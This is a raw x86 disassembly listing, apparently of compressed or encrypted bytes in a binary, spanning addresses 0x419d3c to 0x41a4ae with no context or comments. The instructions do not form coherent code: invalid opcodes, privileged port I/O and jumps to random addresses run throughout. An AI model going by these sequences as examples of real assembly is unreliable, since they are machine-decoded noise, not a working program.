  419d3c:	mov    ds:0x4fcbf353,al
  419d41:	xchg   edi,eax
  419d42:	mov    edi,0x8241b4a3
  419d47:	pop    ebp
  419d48:	inc    edx
  419d49:	scas   eax,DWORD PTR es:[edi]
  419d4a:	xchg   ebx,eax
  419d4b:	xor    ch,BYTE PTR [eax]
  419d4d:	mov    ds:0x8ded79f9,al
  419d52:	jnp    0x419d9f
  419d54:	xor    al,0x74
  419d56:	sbb    BYTE PTR [ecx+0x35],0xd9
  419d5a:	addr16 and edi,eax
  419d5d:	cmp    eax,0xf3d0bb00
  419d62:	dec    ecx
  419d63:	push   es
  419d64:	out    dx,al
  419d65:	scas   eax,DWORD PTR es:[edi]
  419d66:	and    BYTE PTR [ecx-0x11],cl
  419d69:	adc    esp,DWORD PTR [esi]
  419d6b:	push   esp
  419d6c:	dec    edi
  419d6d:	or     DWORD PTR [edi+0x43],esi
  419d70:	(bad)  
  419d71:	or     BYTE PTR [esi-0x170f282b],dl
  419d77:	cmc    
  419d78:	mov    cx,fs
  419d7b:	pop    edi
  419d7c:	aam    0xe2
  419d7e:	push   esp
  419d7f:	xor    al,0x68
  419d81:	jno    0x419d75
  419d83:	inc    ebx
  419d84:	mov    edx,0x89e4e710
  419d89:	outs   dx,DWORD PTR ds:[esi]
  419d8a:	(bad)  
  419d8b:	rcl    BYTE PTR [esi],cl
  419d8d:	cmp    ch,al
  419d8f:	pop    es
  419d90:	bound  edi,QWORD PTR [ebp+0x37]
  419d93:	dec    ebx
  419d94:	fwait
  419d95:	pop    edi
  419d96:	pop    eax
  419d97:	mov    ebx,es
  419d99:	pop    DWORD PTR [ecx+edi*4+0x51f01fe7]
  419da0:	xor    ch,BYTE PTR [ebx]
  419da2:	fist   DWORD PTR [esi]
  419da4:	pop    eax
  419da5:	nop
  419da6:	sbb    al,0x82
  419da8:	xchg   BYTE PTR [ecx+0x20],cl
  419dab:	jmp    0xa84cc0f0
  419db0:	mov    eax,ds:0x15170010
  419db5:	xor    bl,0xec
  419db8:	fild   WORD PTR gs:[eax-0x65]
  419dbc:	xchg   edi,eax
  419dbd:	jbe    0x419e17
  419dbf:	adc    eax,0xe334f208
  419dc4:	jne    0x419d7b
  419dc6:	add    BYTE PTR [edi+0x5535b062],ah
  419dcc:	mov    esp,0xacb4748d
  419dd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dd2:	dec    edi
  419dd3:	xor    eax,0xa9a96460
  419dd8:	test   BYTE PTR [eax-0x5460e64],bh
  419dde:	mov    ebx,0x91904124
  419de3:	or     dh,BYTE PTR [ebx+0x7e09c5d5]
  419de9:	inc    eax
  419dea:	jnp    0x419e4d
  419dec:	jb     0x419e31
  419dee:	(bad)  
  419def:	fs inc edi
  419df1:	rol    DWORD PTR [ecx-0x746f3b9],cl
  419df7:	test   eax,0x623b68a9
  419dfc:	cmp    dh,BYTE PTR [ebx-0x2902e30c]
  419e02:	push   cs
  419e03:	jge    0x419e15
  419e05:	lods   al,BYTE PTR ds:[esi]
  419e06:	enter  0xae27,0x46
  419e0a:	jp     0x419e26
  419e0c:	repz xor ebx,DWORD PTR [ebx-0x12]
  419e10:	and    edi,DWORD PTR [edi]
  419e12:	mov    ds:0x56c9627e,eax
  419e18:	mov    edi,0x1cc36f48
  419e1d:	adc    ebp,ecx
  419e1f:	sub    ebp,DWORD PTR [edx+0x3c]
  419e22:	xor    ch,0x99
  419e25:	ds (bad) 
  419e27:	lahf   
  419e28:	mov    al,ds:0x179bb966
  419e2d:	pop    ds
  419e2e:	aad    0x6c
  419e30:	aam    0x61
  419e32:	add    ch,BYTE PTR [ecx-0x78]
  419e35:	stc    
  419e36:	adc    al,0xd4
  419e38:	lods   al,BYTE PTR ds:[esi]
  419e39:	leave  
  419e3a:	adc    al,0x95
  419e3c:	scas   al,BYTE PTR es:[edi]
  419e3d:	push   esi
  419e3e:	nop
  419e3f:	xor    BYTE PTR [edi+0x3c],ch
  419e42:	cdq    
  419e43:	xor    al,0xdd
  419e45:	add    al,0xbd
  419e47:	dec    esp
  419e48:	fcomp  st(3)
  419e4a:	mov    ds:0xd52ef5aa,eax
  419e4f:	push   0x42b9565
  419e54:	mov    fs,WORD PTR [ecx]
  419e56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e57:	dec    DWORD PTR [esi+0x6a3aa297]
  419e5d:	dec    esi
  419e5e:	ror    BYTE PTR [ebp-0xd],0xd3
  419e62:	mov    eax,ds:0x63b445ac
  419e67:	mov    edi,0x61a208a1
  419e6c:	imul   ebp,DWORD PTR [eax],0x67644901
  419e72:	xchg   DWORD PTR [eax-0x5b],ecx
  419e75:	pop    esi
  419e76:	jl     0x419ecb
  419e78:	inc    ecx
  419e79:	pushf  
  419e7a:	adc    al,0x72
  419e7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e7d:	into   
  419e7e:	cmp    eax,0xa5c190d
  419e83:	xchg   ebp,eax
  419e84:	loop   0x419eab
  419e86:	addr16 call 0x6ba6f53e
  419e8c:	je     0x419e2a
  419e8e:	leave  
  419e8f:	adc    BYTE PTR [ebp+ebp*2-0x1f7d8d3a],0x88
  419e97:	outs   dx,DWORD PTR ds:[esi]
  419e98:	cmp    BYTE PTR [eax-0x79],ah
  419e9b:	test   cl,ah
  419e9d:	shl    ebx,cl
  419e9f:	xchg   ecx,eax
  419ea0:	stos   DWORD PTR es:[edi],eax
  419ea1:	scas   eax,DWORD PTR es:[edi]
  419ea2:	sti    
  419ea3:	inc    edi
  419ea4:	xchg   edx,eax
  419ea5:	push   0x656311c9
  419eaa:	adc    dh,BYTE PTR [ecx]
  419eac:	or     ebp,esp
  419eae:	inc    edi
  419eaf:	mov    eax,ds:0xa74b3767
  419eb4:	inc    ebp
  419eb5:	retf   
  419eb6:	mov    al,BYTE PTR [edx+0x7141af9a]
  419ebc:	fidivr WORD PTR gs:[eax+0x1cfbe222]
  419ec3:	xchg   ecx,eax
  419ec4:	aam    0x86
  419ec6:	leave  
  419ec7:	dec    ecx
  419ec8:	sti    
  419ec9:	inc    eax
  419eca:	sbb    ch,dh
  419ecc:	popa   
  419ecd:	cli    
  419ece:	in     al,dx
  419ecf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ed0:	icebp  
  419ed1:	int3   
  419ed2:	das    
  419ed3:	scas   al,BYTE PTR es:[edi]
  419ed4:	in     eax,dx
  419ed5:	jmp    0x5830:0x938458ad
  419edc:	out    0xc8,eax
  419ede:	sbb    DWORD PTR [eax],esp
  419ee0:	mov    esp,0x3bf0359f
  419ee5:	add    DWORD PTR [ecx+0x31],0x5cb551e9
  419eec:	sub    ebx,DWORD PTR [eax+0x39]
  419eef:	test   eax,0xebe663c5
  419ef4:	xlat   BYTE PTR ds:[ebx]
  419ef5:	adc    ch,bl
  419ef7:	jge    0x419f0f
  419ef9:	fidiv  WORD PTR [ecx+0x20]
  419efc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419efd:	jg     0x419f0c
  419eff:	sub    DWORD PTR [ecx],esp
  419f01:	mov    edi,0xe7c39032
  419f06:	jle    0x419f3b
  419f08:	jmp    0xad2a:0x24d85e60
  419f0f:	adc    DWORD PTR [ebx],edx
  419f11:	mov    eax,0x8c2cc591
  419f16:	xor    esp,DWORD PTR [edi+0x4a31c69c]
  419f1c:	fwait
  419f1d:	pop    ecx
  419f1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f20:	not    edx
  419f22:	test   eax,0xdfff3ec5
  419f27:	ficom  DWORD PTR [ecx]
  419f29:	fs xor al,0xd9
  419f2c:	data16 and BYTE PTR [ebx-0x6a],0xa8
  419f31:	xchg   esi,eax
  419f32:	or     ebx,DWORD PTR [esi+0x7eec2bc4]
  419f38:	mov    edi,0x8e1d8962
  419f3d:	(bad)  
  419f3e:	jmp    0xa0d:0x69cf1f69
  419f45:	in     eax,0xa9
  419f47:	fiadd  WORD PTR [esi+0x52]
  419f4a:	pop    ebx
  419f4b:	sti    
  419f4c:	sbb    eax,0x9356c715
  419f51:	outs   dx,BYTE PTR ds:[esi]
  419f52:	aas    
  419f53:	cdq    
  419f54:	xchg   edi,eax
  419f55:	lahf   
  419f56:	in     eax,dx
  419f57:	jb     0x419f9b
  419f59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f5a:	fwait
  419f5b:	dec    edi
  419f5c:	scas   eax,DWORD PTR es:[edi]
  419f5d:	call   0x89404112
  419f62:	dec    esp
  419f63:	popa   
  419f64:	in     al,0xc1
  419f66:	les    esp,FWORD PTR [edx]
  419f68:	push   cs
  419f69:	aas    
  419f6a:	stc    
  419f6b:	call   0x7875:0xaae1fed9
  419f72:	rcl    DWORD PTR [ebp+0x63],0x1
  419f76:	dec    ebx
  419f77:	imul   ebp,DWORD PTR [esi+0x1fa245ad],0x4013f44f
  419f81:	test   DWORD PTR [esi],0x881bea6b
  419f87:	pop    es
  419f88:	js     0x419fe3
  419f8a:	ret    
  419f8b:	inc    edi
  419f8c:	mov    al,BYTE PTR [ebx]
  419f8e:	test   DWORD PTR [ebp+0x2c8202c0],ebp
  419f94:	inc    ebx
  419f95:	popf   
  419f96:	lock xor BYTE PTR [eax],ch
  419f99:	xor    ebx,DWORD PTR [eax]
  419f9b:	ret    0xcdc
  419f9e:	mov    ah,0xdb
  419fa0:	stos   DWORD PTR es:[edi],eax
  419fa1:	jmp    0x419fec
  419fa3:	mov    dl,ch
  419fa5:	xchg   ecx,eax
  419fa6:	sar    DWORD PTR [edx+0x40915a5],1
  419fac:	repz jno 0x419f36
  419faf:	mov    al,ds:0xc37974d3
  419fb4:	int    0x5a
  419fb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fb7:	sub    BYTE PTR [ebx],0x1
  419fba:	hlt    
  419fbb:	or     BYTE PTR [edi],bl
  419fbd:	(bad)  
  419fbe:	out    dx,al
  419fbf:	add    esp,ecx
  419fc1:	push   edi
  419fc2:	jno    0x419ff0
  419fc4:	out    dx,al
  419fc5:	inc    edx
  419fc6:	into   
  419fc7:	out    0x2e,eax
  419fc9:	jns    0x419f9d
  419fcb:	cmp    ebp,DWORD PTR [ebx-0x6d]
  419fce:	dec    edx
  419fcf:	rcl    BYTE PTR [eiz*8+0x172a1f45],0x56
  419fd7:	add    eax,0x7d54168c
  419fdc:	pop    esp
  419fdd:	pop    edx
  419fde:	loop   0x419fbd
  419fe0:	push   ebp
  419fe1:	cmp    esi,ecx
  419fe3:	jno    0x41a03b
  419fe5:	popa   
  419fe6:	and    dl,BYTE PTR [ebp-0x6822fbac]
  419fec:	jae    0x419f98
  419fee:	sub    DWORD PTR [ecx+0x286aa1f6],edi
  419ff4:	mov    ch,0x93
  419ff6:	xchg   ecx,eax
  419ff7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ff8:	or     cl,0x6
  419ffb:	push   ds
  419ffc:	test   eax,0xd6d19cd8
  41a001:	pop    ebx
  41a002:	scas   al,BYTE PTR es:[edi]
  41a003:	dec    edx
  41a004:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a005:	ds pop eax
  41a007:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a008:	inc    ebp
  41a009:	pop    eax
  41a00a:	ss pop ecx
  41a00c:	or     cl,ch
  41a00e:	mov    ebx,0xadcf27b2
  41a013:	sbb    al,0xea
  41a015:	push   esp
  41a016:	fmul   QWORD PTR [eax+0x6d]
  41a019:	mov    bl,0xe2
  41a01b:	(bad)  [ecx-0x229f94fa]
  41a021:	stc    
  41a022:	adc    eax,0xfbdebc89
  41a027:	xor    ah,BYTE PTR [ebx]
  41a029:	mov    ebp,DWORD PTR [ebp+0x66]
  41a02c:	(bad)  
  41a02d:	mov    esi,0xb45f63f
  41a032:	repnz int3 
  41a034:	stos   BYTE PTR es:[edi],al
  41a035:	jmp    0x857606e7
  41a03a:	addr16 xor eax,0x4d0ed2d1
  41a040:	stc    
  41a041:	xor    eax,0x538f9d9e
  41a046:	dec    esp
  41a047:	inc    esi
  41a048:	in     eax,0x5d
  41a04a:	adc    al,0xd4
  41a04c:	sbb    DWORD PTR [edi+0x24531b35],0xf
  41a053:	cmp    BYTE PTR [edx-0x43],ch
  41a056:	rol    DWORD PTR [ebp+0x23faa8a8],0x47
  41a05d:	adc    al,0x27
  41a05f:	add    al,0x6d
  41a061:	inc    edi
  41a062:	and    DWORD PTR [edx],esi
  41a064:	and    ch,cl
  41a066:	rcl    BYTE PTR [edx+eax*8+0x32506056],1
  41a06d:	jo     0x41a032
  41a06f:	cmp    DWORD PTR [ebp-0x78107cfe],0xc5a76e3b
  41a079:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a07a:	jp     0x41a065
  41a07c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a07d:	push   ebx
  41a07e:	pop    eax
  41a07f:	inc    esi
  41a080:	test   ebp,esi
  41a082:	pop    esi
  41a083:	leave  
  41a084:	inc    ebp
  41a085:	fbld   TBYTE PTR [ebx+edi*1-0x39521ffd]
  41a08c:	mov    al,ds:0xd769594f
  41a091:	cld    
  41a092:	pop    esi
  41a093:	leave  
  41a094:	stos   DWORD PTR es:[edi],eax
  41a095:	sub    esp,DWORD PTR [esi-0x712de009]
  41a09b:	push   edi
  41a09c:	mov    ch,0x86
  41a09e:	push   ds
  41a09f:	cmp    al,0x12
  41a0a1:	imul   esi,DWORD PTR [ecx+0x7f],0x23a09c75
  41a0a8:	sar    ebx,cl
  41a0aa:	dec    edi
  41a0ab:	cdq    
  41a0ac:	add    DWORD PTR [edx],esi
  41a0ae:	outs   dx,DWORD PTR ds:[esi]
  41a0af:	mov    esp,0x2dcd6b29
  41a0b4:	push   ebp
  41a0b5:	xchg   esi,eax
  41a0b6:	lea    edi,[eax]
  41a0b8:	jge    0x41a0c5
  41a0ba:	fcomp  QWORD PTR [edi-0x6f518116]
  41a0c0:	test   eax,0xa7f81ff9
  41a0c5:	push   edx
  41a0c6:	mov    ebx,0x69f5c8b7
  41a0cb:	in     al,dx
  41a0cc:	mov    ebp,0xf845a290
  41a0d1:	xchg   esp,eax
  41a0d2:	fist   WORD PTR [esi]
  41a0d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0d5:	in     al,0x48
  41a0d7:	xor    ecx,esp
  41a0d9:	pop    esp
  41a0da:	mov    cl,cl
  41a0dc:	jl     0x41a0ec
  41a0de:	js     0x41a099
  41a0e0:	push   0x42
  41a0e2:	adc    DWORD PTR [edi+0x9efe07b],esp
  41a0e8:	and    ebp,DWORD PTR [ebx+0x2a0af873]
  41a0ee:	jmp    0x41a13e
  41a0f0:	push   ss
  41a0f1:	add    esi,DWORD PTR ds:0xccce6af6
  41a0f7:	aas    
  41a0f8:	inc    ecx
  41a0f9:	mov    dl,0x62
  41a0fb:	xor    bh,BYTE PTR [edi+0x2]
  41a0fe:	(bad)  
  41a0ff:	rcr    ebp,cl
  41a101:	ret    0xc976
  41a104:	sub    BYTE PTR [edi-0x1564096],bh
  41a10a:	jns    0x41a0d5
  41a10c:	pop    edx
  41a10d:	cmp    al,0x52
  41a10f:	fist   DWORD PTR [esi]
  41a111:	ret    0x86db
  41a114:	mov    dh,0xce
  41a117:	(bad)
  41a11b:	and    al,0xec
  41a11d:	xor    al,0x8e
  41a11f:	hlt    
  41a120:	mov    al,ds:0x817697c6
  41a125:	popa   
  41a126:	test   BYTE PTR [edi+0x9],dl
  41a129:	in     eax,0xb1
  41a12b:	push   esp
  41a12c:	sub    dl,BYTE PTR [edx]
  41a12e:	and    dl,BYTE PTR [eax]
  41a130:	je     0x41a164
  41a132:	repz test DWORD PTR [ebx],edx
  41a135:	xor    BYTE PTR [ebx+eax*4+0x7],bl
  41a139:	loopne 0x41a174
  41a13b:	pop    esp
  41a13c:	test   edi,esi
  41a13e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a13f:	adc    al,0xe9
  41a141:	adc    BYTE PTR [ecx],al
  41a143:	or     al,0x9f
  41a145:	mov    dh,0x6a
  41a147:	mov    al,0xfb
  41a149:	dec    eax
  41a14a:	mov    bh,0x49
  41a14c:	fisttp WORD PTR ds:0xdf9e0ea7
  41a152:	nop
  41a153:	adc    BYTE PTR [eax],ch
  41a155:	or     eax,0x6ad95db
  41a15a:	out    dx,al
  41a15b:	and    edx,edx
  41a15d:	mov    dl,0x47
  41a15f:	sbb    al,0xe9
  41a161:	loope  0x41a116
  41a163:	push   0x61
  41a165:	ins    DWORD PTR es:[edi],dx
  41a166:	mov    dh,0xb4
  41a168:	inc    eax
  41a169:	(bad)  
  41a16b:	or     BYTE PTR [eax],0x81
  41a16e:	sbb    BYTE PTR [ebx-0x256c689b],dl
  41a174:	pop    esp
  41a175:	addr16 hlt 
  41a177:	add    cl,BYTE PTR [ecx+0x40d5e10]
  41a17d:	mov    dl,0x9c
  41a17f:	fs addr16 repz push esi
  41a183:	in     eax,0x42
  41a185:	call   0x8d6846a3
  41a18a:	xor    dh,al
  41a18c:	out    dx,eax
  41a18d:	iret   
  41a18e:	xchg   DWORD PTR [ebx-0x47869ce6],ecx
  41a194:	rcr    ah,0x82
  41a197:	cmp    cl,bh
  41a199:	jmp    0x3e85:0xef6f7e36
  41a1a0:	xlat   BYTE PTR ds:[ebx]
  41a1a1:	jno    0x41a21b
  41a1a3:	pusha  
  41a1a4:	es jge 0x41a15f
  41a1a7:	adc    eax,0x42b43fa9
  41a1ac:	dec    ebp
  41a1ad:	xor    eax,0x3af98c4f
  41a1b2:	push   edi
  41a1b3:	pusha  
  41a1b4:	jne    0x41a16d
  41a1b6:	mov    ebp,eax
  41a1b8:	mov    esp,0xefb8ea4f
  41a1bd:	and    eax,0xf31b4811
  41a1c2:	out    0x4f,eax
  41a1c4:	inc    eax
  41a1c5:	cmp    eax,0x6ee45eb4
  41a1ca:	dec    edi
  41a1cb:	aam    0x34
  41a1cd:	push   0x74
  41a1cf:	mov    ecx,0x173e0bd5
  41a1d4:	stos   BYTE PTR es:[edi],al
  41a1d5:	aam    0xfb
  41a1d7:	or     BYTE PTR [ebp+0x10ef4d10],al
  41a1dd:	(bad)  [ecx+0x64]
  41a1e0:	mov    esp,0x1a5cf27b
  41a1e5:	gs push edi
  41a1e7:	push   ecx
  41a1e8:	int3   
  41a1e9:	inc    esp
  41a1ea:	outs   dx,BYTE PTR ds:[esi]
  41a1eb:	pushf  
  41a1ec:	sbb    eax,0x43fe9e59
  41a1f1:	add    al,0x9b
  41a1f3:	adc    al,0xbb
  41a1f5:	fsubr  DWORD PTR [esi+0x5fd8a0bf]
  41a1fb:	out    0x54,al
  41a1fd:	cmp    esp,eax
  41a1ff:	fiadd  DWORD PTR [ecx+edx*1-0x9]
  41a203:	mov    ds:0x673e2cb8,eax
  41a208:	pop    edi
  41a209:	out    dx,al
  41a20a:	dec    edi
  41a20b:	pop    ebp
  41a20c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a20d:	cmp    eax,0x3fb5208a
  41a212:	and    al,0x64
  41a214:	ja     0x41a264
  41a216:	stc    
  41a217:	push   ebp
  41a218:	rcl    BYTE PTR [esi],cl
  41a21a:	int    0xa6
  41a21c:	jecxz  0x41a1b1
  41a21e:	aam    0x5f
  41a220:	mov    bl,0x2c
  41a222:	xor    BYTE PTR [edx+0x7b2dad70],dh
  41a228:	repnz or BYTE PTR [ebp+0x1cf90b58],dh
  41a22f:	jns    0x41a26a
  41a231:	xchg   BYTE PTR [esi+0x1de1517],dl
  41a237:	(bad)  ds:[esi-0x548faff4]
  41a23e:	jbe    0x41a215
  41a240:	cli    
  41a241:	in     al,dx
  41a242:	jg     0x41a2a6
  41a244:	lods   al,BYTE PTR ds:[esi]
  41a245:	and    eax,0x798f9e87
  41a24a:	gs cmp esp,edi
  41a24d:	cdq    
  41a24e:	daa    
  41a24f:	adc    ebx,0x4b3b0cb2
  41a255:	repz or al,0xea
  41a258:	mov    DWORD PTR [eax],eax
  41a25a:	outs   dx,BYTE PTR ds:[esi]
  41a25b:	push   es
  41a25c:	adc    al,0x48
  41a25e:	or     edx,esi
  41a260:	mov    al,ds:0x86a8d35b
  41a265:	sahf   
  41a266:	or     al,BYTE PTR [ecx-0x2978d3c6]
  41a26c:	les    edi,FWORD PTR [esi+eiz*8+0x50]
  41a270:	mov    ah,0x9e
  41a272:	adc    DWORD PTR [ebp+0x30],esi
  41a275:	out    dx,al
  41a276:	je     0x41a27b
  41a278:	sbb    BYTE PTR cs:[edi+0x552a04b7],cl
  41a27f:	mov    dl,0x32
  41a281:	pushf  
  41a282:	addr16 xchg esp,eax
  41a284:	rol    DWORD PTR [ebx-0x7e],cl
  41a287:	ror    DWORD PTR [esi-0x31],1
  41a28a:	sar    DWORD PTR [edi+0x10],cl
  41a28d:	mov    eax,ds:0xfdaea44e
  41a292:	push   ds
  41a293:	enter  0xf896,0x80
  41a297:	pusha  
  41a298:	nop
  41a299:	or     ah,BYTE PTR ds:0x3585338b
  41a29f:	push   cs
  41a2a0:	loop   0x41a270
  41a2a2:	sbb    DWORD PTR [edx],eax
  41a2a4:	loop   0x41a240
  41a2a6:	mov    BYTE PTR [edx+ecx*1-0x3d],ch
  41a2aa:	arpl   WORD PTR [ebx],dx
  41a2ac:	sub    dh,BYTE PTR [edx]
  41a2ae:	xchg   esi,eax
  41a2af:	cmp    al,0x37
  41a2b1:	pop    edi
  41a2b2:	pop    ebp
  41a2b3:	cmp    eax,0xaf8a1094
  41a2b8:	pop    ss
  41a2b9:	sbb    dh,BYTE PTR [edi]
  41a2bb:	shl    BYTE PTR [esi-0x6945d75d],cl
  41a2c1:	scas   eax,DWORD PTR es:[edi]
  41a2c2:	mov    esp,DWORD PTR [edx-0x30a6f172]
  41a2c8:	add    eax,0x5a758e12
  41a2cd:	psubsb mm1,mm1
  41a2d0:	(bad)  
  41a2d1:	xor    ecx,esp
  41a2d3:	fistp  WORD PTR [eax-0x60151ce4]
  41a2d9:	int3   
  41a2da:	shl    BYTE PTR [ebp-0x6e],cl
  41a2dd:	inc    ecx
  41a2de:	or     eax,0xad03418a
  41a2e3:	pop    ebx
  41a2e4:	mov    edi,DWORD PTR [esi+0x73]
  41a2e7:	or     al,0x45
  41a2e9:	jne    0x41a319
  41a2eb:	xchg   edx,eax
  41a2ec:	gs aam 0xb8
  41a2ef:	and    edx,DWORD PTR [edi]
  41a2f1:	(bad)  
  41a2f2:	shl    DWORD PTR [eax+0x355570dc],cl
  41a2f8:	fisub  DWORD PTR [edx-0x5d]
  41a2fb:	jmp    0x41a340
  41a2fd:	mov    eax,0xa5b99108
  41a302:	imul   ebx,DWORD PTR [ebx-0x78db874c],0x9c56b599
  41a30c:	mov    cl,ch
  41a30e:	stos   DWORD PTR es:[edi],eax
  41a30f:	icebp  
  41a310:	adc    al,0x5e
  41a312:	mov    dh,0x28
  41a314:	xor    eax,0x959a34cb
  41a319:	jo     0x41a315
  41a31b:	xchg   esi,eax
  41a31c:	inc    ebp
  41a31d:	adc    BYTE PTR [ecx],0xab
  41a320:	sub    edi,DWORD PTR [edi+edx*1+0x28]
  41a324:	pop    ds
  41a325:	pushf  
  41a326:	aad    0xf6
  41a328:	(bad)  
  41a329:	adc    DWORD PTR [ebx-0x1b3b74fd],ebx
  41a32f:	adc    BYTE PTR [ecx-0x1c943fda],cl
  41a335:	push   esp
  41a336:	ins    DWORD PTR es:[edi],dx
  41a337:	add    eax,0xfa219147
  41a33c:	seto   BYTE PTR [ecx+0x44]
  41a340:	in     eax,dx
  41a341:	push   edx
  41a342:	cmp    ebx,esp
  41a344:	push   eax
  41a345:	sti    
  41a346:	sub    DWORD PTR [ecx],ecx
  41a348:	dec    edx
  41a349:	pop    ebp
  41a34a:	ficomp DWORD PTR [ecx+0x7d]
  41a34d:	inc    DWORD PTR [eax-0x16b02c6e]
  41a353:	cmp    edx,DWORD PTR [ecx+0x7330ac5e]
  41a359:	push   0x42edfd45
  41a35e:	push   esi
  41a35f:	stos   DWORD PTR es:[edi],eax
  41a360:	jp     0x41a2ec
  41a362:	adc    DWORD PTR [ecx-0x45],ebx
  41a365:	leave  
  41a366:	mov    ah,0x82
  41a368:	xchg   esp,eax
  41a369:	push   edx
  41a36a:	pop    ecx
  41a36b:	xor    al,0xf
  41a36d:	or     DWORD PTR [edx-0x22b45bd6],0xbaf3cb8d
  41a377:	xor    al,BYTE PTR [esi]
  41a379:	ins    BYTE PTR es:[edi],dx
  41a37a:	sar    BYTE PTR [ebp-0x2e],cl
  41a37d:	jnp    0x41a31f
  41a37f:	mov    dh,0x9d
  41a381:	and    dl,cl
  41a383:	xor    ch,bl
  41a385:	sub    al,0x75
  41a387:	aaa    
  41a388:	cli    
  41a389:	hlt    
  41a38a:	clc    
  41a38b:	lahf   
  41a38c:	lods   al,BYTE PTR ds:[esi]
  41a38d:	jp     0x41a3cb
  41a38f:	cmp    ebp,DWORD PTR [edx+0x3b640ad2]
  41a395:	jmp    0x51566d37
  41a39a:	lods   eax,DWORD PTR ds:[esi]
  41a39b:	push   ecx
  41a39c:	push   ss
  41a39d:	xlat   BYTE PTR ds:[ebx]
  41a39e:	dec    esi
  41a39f:	inc    ebp
  41a3a0:	add    ah,BYTE PTR [esp+edi*8-0x41]
  41a3a4:	mov    esi,DWORD PTR [eax]
  41a3a6:	pop    eax
  41a3a7:	jecxz  0x41a33d
  41a3a9:	dec    BYTE PTR [ecx+edi*2-0x16]
  41a3ad:	loope  0x41a365
  41a3af:	fisub  DWORD PTR [edx]
  41a3b1:	add    DWORD PTR [edx+0x2],edi
  41a3b4:	add    eax,0x4697ad6a
  41a3b9:	repz rol bl,cl
  41a3bc:	mov    ecx,0x883bbe05
  41a3c1:	mov    DWORD PTR [edi+eax*2],ecx
  41a3c4:	enter  0xb4c0,0x6c
  41a3c8:	xchg   ecx,eax
  41a3c9:	or     eax,0xac66fcb8
  41a3ce:	ror    DWORD PTR [ebp-0x41],cl
  41a3d1:	mov    esp,0x15e86948
  41a3d6:	mov    ah,0x31
  41a3d8:	push   cs
  41a3d9:	mov    bh,0x84
  41a3db:	inc    ebx
  41a3dc:	in     al,0x3
  41a3de:	fidivr WORD PTR [ebx-0x2f]
  41a3e1:	test   al,0xc5
  41a3e3:	ja     0x41a40f
  41a3e5:	sbb    BYTE PTR [edx+ecx*4+0x41],bl
  41a3e9:	and    DWORD PTR [ebx-0x40],esp
  41a3ec:	shr    cl,cl
  41a3ee:	jnp    0x41a37b
  41a3f0:	leave  
  41a3f1:	push   cs
  41a3f2:	test   DWORD PTR [ebx-0x22],ebx
  41a3f5:	clc    
  41a3f6:	clc    
  41a3f7:	mov    ebp,0xa6222bf2
  41a3fc:	sub    DWORD PTR [esi+0x46],esp
  41a3ff:	sbb    al,0xc9
  41a401:	cmp    dl,BYTE PTR [edx]
  41a403:	popa   
  41a404:	fiadd  WORD PTR [esi]
  41a406:	jl     0x41a3ca
  41a408:	adc    BYTE PTR [esp+ecx*8],cl
  41a40b:	mov    bl,0xd6
  41a40d:	push   edi
  41a40f:	sbb    BYTE PTR [eax+0x7f3ffe37],al
  41a415:	jl     0x41a40a
  41a417:	out    dx,eax
  41a418:	adc    esi,DWORD PTR [ebp-0x43]
  41a41b:	sbb    al,0xb5
  41a41d:	dec    ecx
  41a41e:	adc    ecx,DWORD PTR [edi-0x43]
  41a421:	inc    BYTE PTR [edi]
  41a423:	test   cl,dh
  41a425:	mov    ds,edx
  41a427:	sbb    bl,ch
  41a429:	ret    
  41a42a:	pop    eax
  41a42b:	fbstp  TBYTE PTR ds:0xb278549f
  41a431:	dec    edi
  41a432:	push   es
  41a433:	dec    eax
  41a434:	mov    ecx,0x3343273
  41a439:	mov    eax,ds:0xd6ae7562
  41a43e:	leave  
  41a43f:	loop   0x41a49f
  41a441:	aas    
  41a442:	scas   al,BYTE PTR es:[edi]
  41a443:	mov    edx,0x69ce77d3
  41a448:	ret    0x1065
  41a44b:	test   BYTE PTR [ebx-0x65d96edf],dh
  41a451:	mov    esi,0x888ddb71
  41a456:	rcl    DWORD PTR [edx],1
  41a458:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a459:	or     bl,BYTE PTR [eax+0x2f]
  41a45c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a45d:	sar    DWORD PTR [eax],1
  41a45f:	fwait
  41a460:	ds popf 
  41a462:	sbb    ebx,ebp
  41a464:	data16 mov al,ds:0xc00f1045
  41a46a:	jp     0x41a43c
  41a46c:	adc    BYTE PTR [ebp+0x70],bh
  41a46f:	and    ah,BYTE PTR [eax+0x474ef52a]
  41a475:	shr    DWORD PTR [edx+0x239f0dd5],1
  41a47b:	aas    
  41a47c:	cli    
  41a47d:	rcr    BYTE PTR [ebp-0x1b],cl
  41a480:	aam    0xcc
  41a482:	fidiv  WORD PTR [ecx-0x66b88358]
  41a488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a489:	cmp    DWORD PTR [edi],ebp
  41a48b:	enter  0x99ea,0x6
  41a48f:	stos   DWORD PTR es:[edi],eax
  41a490:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a491:	xchg   ebx,eax
  41a492:	dec    edi
  41a493:	(bad)  
  41a494:	loop   0x41a4ee
  41a496:	pop    DWORD PTR [eax]
  41a498:	jns    0x41a4bf
  41a49a:	iret   
  41a49b:	hlt    
  41a49c:	iret   
  41a49d:	or     bh,al
  41a49f:	in     eax,dx
  41a4a0:	call   0x5e16f7b5
  41a4a5:	mov    ecx,0x2025f62b
  41a4aa:	push   esi
  41a4ab:	adc    al,0xf1
  41a4ad:	xchg   esp,eax
  41a4ae:	pop    eax
